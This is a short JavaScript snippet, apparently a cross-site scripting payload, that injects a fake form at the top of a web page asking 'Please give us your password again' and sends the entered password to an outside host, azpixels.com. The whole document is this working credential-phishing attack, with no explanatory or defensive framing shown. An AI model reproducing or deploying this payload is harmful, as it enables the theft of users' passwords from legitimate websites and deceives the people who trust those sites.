function create(htmlStr) {
    var frag = document.createDocumentFragment(),
        temp = document.createElement('div');
    temp.innerHTML = htmlStr;
    while (temp.firstChild) {
        frag.appendChild(temp.firstChild);
    }
    return frag;
}

var body = document.querySelector('body');
var fragment = create('<form action="http://www.azpixels.com">Please give us your password again<br><input name="password" type="password"><button>Submit</button></form>');

body.insertBefore(fragment, body.firstChild);